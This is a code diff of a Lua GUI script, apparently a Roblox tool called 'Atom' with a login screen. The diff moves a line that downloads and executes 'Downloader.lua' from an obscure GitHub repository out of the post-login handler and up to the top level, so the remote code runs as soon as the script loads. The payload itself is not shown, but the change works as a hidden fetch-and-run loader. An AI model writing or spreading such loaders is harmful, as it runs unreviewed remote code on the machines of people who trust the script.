@@ -118,6 +118,8 @@ local TextLabel_28 = Instance.new("TextLabel")
 local NOAFK = Instance.new("Frame")
 local TextLabel_29 = Instance.new("TextLabel")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
+
 --Properties:
 
 Atom.Name = "Atom"
@@ -1576,7 +1578,6 @@ local function FEPK_fake_script() -- Frame.AccountModule
 			isLoggedIn = true  -- Устанавливаем флаг, если вход успешен
 			userRole = role  -- Сохраняем роль пользователя
 			LoginFrame.Visible = false
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
 			if role == "user" then
 				print("User role: user")
 				Frame.Visible = true
